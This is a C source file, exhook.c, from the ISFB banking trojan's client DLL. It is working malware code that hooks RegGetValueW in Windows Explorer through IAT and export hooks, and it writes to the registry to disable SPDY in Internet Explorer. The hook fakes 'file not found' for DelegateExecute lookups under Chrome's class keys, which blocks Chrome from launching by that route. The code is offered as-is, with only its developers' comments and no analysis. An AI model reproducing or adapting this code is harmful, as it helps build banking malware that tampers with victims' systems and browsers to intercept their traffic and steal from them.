//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: exhook.c
// $Revision: 350 $
// $Date: 2014-09-24 13:58:53 +0400 (Ср, 24 сен 2014) $
// description:
//	ISFB client DLL. Windows Explorer specific hooks.

#include "..\common\common.h"
#include "parser.h"


typedef WINERROR (__stdcall* FUNC_RegQueryValueExW)(HKEY hKey, LPWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
typedef WINERROR (__stdcall* FUNC_RegGetValueW)(HKEY hkey, LPWSTR lpSubKey, LPWSTR lpValue, DWORD dwFlags, LPDWORD pdwType, PVOID pvData, LPDWORD pcbData);

WINERROR __stdcall my_RegQueryValueExW(HKEY hKey, LPWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
WINERROR __stdcall my_RegGetValueW(HKEY hkey, LPWSTR lpSubKey, LPWSTR lpValue, DWORD dwFlags, LPDWORD pdwType, PVOID pvData, LPDWORD pcbData);


HOOK_FUNCTION hook_RegGetValueW = {szKernelbase, szRegGetValueW, &my_RegGetValueW, NULL};
HOOK_FUNCTION hook_RegGetValueW0 = {NULL, szRegGetValueW, &my_RegGetValueW, NULL};

static HOOK_DESCRIPTOR RegGetValueIatHook =
	DEFINE_HOOK(&hook_RegGetValueW0, HF_TYPE_IAT);

static HOOK_DESCRIPTOR RegGetValueExportHook = 
	DEFINE_HOOK(&hook_RegGetValueW, HF_TYPE_EXPORT);


//
//	Sets Windows Explorer specific hooks.
//
WINERROR ExSetHooks(VOID)
{
	WINERROR	Status = NO_ERROR;

	if (LOBYTE(LOWORD(g_SystemVersion)) == 6 && HIBYTE(LOWORD(g_SystemVersion)) >= 2)
	{
		HKEY	hKey;
		ULONG	Enabled = 0;

		// Disabling SPDY support within IE
		if (RegOpenKey(HKEY_CURRENT_USER, szInternetSettings, &hKey) == NO_ERROR)
		{
			RegSetValueEx(hKey, szEnableSpdy, 0, REG_DWORD, (PCHAR)&Enabled, sizeof(ULONG));
			RegCloseKey(hKey);
		}
		
		// Setting the registry hook for Windows 8 and higher OSes
		Status = ParserHookImportExport((PHOOK_DESCRIPTOR)&RegGetValueIatHook, 1, (PHOOK_DESCRIPTOR)&RegGetValueExportHook, 1);
	}	// if (LOBYTE(LOWORD(g_SystemVersion)) == 6 && HIBYTE(LOWORD(g_SystemVersion)) >= 2)

	return(Status);
}


//
//	Hook function.
//	This function returns ERROR_FILE_NOT_FOUND while querying some pre-defined registry values.
//	The idea is to disable starting some applications using Delegate Execute method.
//
WINERROR __stdcall my_RegGetValueW(
	HKEY hKey, 
	LPWSTR lpSubKey,
	LPWSTR lpValue,
	DWORD dwFlags,
	LPDWORD pdwType,
	PVOID pvData,
	LPDWORD pcbData
	)
{
	WINERROR Status = NO_ERROR;
	ULONG	NameLen = 0;
	LPWSTR	pKeyName = lpSubKey;
	PKEY_NAME_INFORMATION pNameBuffer = NULL;

	ENTER_HOOK();

	if (lpValue && !StrCmpIW(lpValue, wczDelegateExecute))
	{
		ZwQueryKey(hKey, KeyNameInformation, NULL, 0, &NameLen);
		if (NameLen)
		{
			if (lpSubKey)
				NameLen += lstrlenW(lpSubKey) * sizeof(WCHAR);

			if (pNameBuffer = AppAlloc(NameLen + 2 * sizeof(WCHAR)))
			{
				if (NT_SUCCESS(ZwQueryKey(hKey, KeyNameInformation, pNameBuffer, NameLen, &NameLen)))
				{
					pKeyName = (LPWSTR)&pNameBuffer->Name;
					NameLen -= FIELD_OFFSET(KEY_NAME_INFORMATION, Name);

					if (lpSubKey)
					{
						pKeyName[NameLen / sizeof(WCHAR)] = '\\';
						lstrcpyW(pKeyName + (NameLen / sizeof(WCHAR)) + 1, lpSubKey); 
					}
					else
						pKeyName[NameLen / sizeof(WCHAR)] = 0;
				}	// if (NT_SUCCESS(ZwQueryKey(hKey, 3, pKeyName, NameLen, &NameLen)))
				else
				{
					AppFree(pNameBuffer);
					pNameBuffer = NULL;
				}	
			}	// if (pKeyName = AppAlloc(NameLen + 2 * sizeof(WCHAR)))
		}	// if (NameLen)

		DbgPrint("ISFB_%04x: RegGetValueW hook \"%S\":\"%S\".\n", g_CurrentProcessId, pKeyName, lpValue);

		if (StrStrIW(pKeyName, wczClassesChrome))
			Status = ERROR_FILE_NOT_FOUND;

		if (pNameBuffer)
			AppFree(pNameBuffer);
	}	// if (lpValue && !StrCmpIW(lpValue, wczDelegateExecute))

	if (Status == NO_ERROR)
		Status = ((FUNC_RegGetValueW)(hook_RegGetValueW.Original))(hKey, lpSubKey, lpValue, dwFlags, pdwType, pvData, pcbData);

	LEAVE_HOOK();

	return(Status);
}